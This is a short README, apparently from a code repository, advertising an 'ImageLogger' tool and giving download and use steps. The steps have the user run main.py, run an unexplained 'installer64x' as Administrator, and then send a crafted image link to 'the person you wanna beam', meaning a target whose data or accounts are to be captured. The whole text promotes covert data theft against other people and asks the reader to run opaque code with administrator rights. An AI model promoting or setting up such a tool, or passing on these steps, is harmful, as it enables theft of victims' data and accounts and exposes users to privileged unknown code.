MAKE SURE YOU HAVE PYTHON 3.11+ INSTALLED FOR THIS TO WORK!(MOST IMPORTANT)

HelloWorld's ImageLogger Is One of actually probably the BEST image logger in the internet!
First Step In Downloading: Run main.py and wait for it to automatically close (5 - 10 seconds)
Second Step In Downloading: Run installer64x as Administrator If you dont see installer64x there is a high chance that your OS is not compatible with this imagelogger as it only works for windows 7 and windows 10 (windows 11 and vista compatibility coming next update)
Last Step In Downloading: After you ran installer64x run main.py again and insert the image's link address of your chice and send it to the person you wanna beam (make sure to stay beamedðŸ˜Ž)
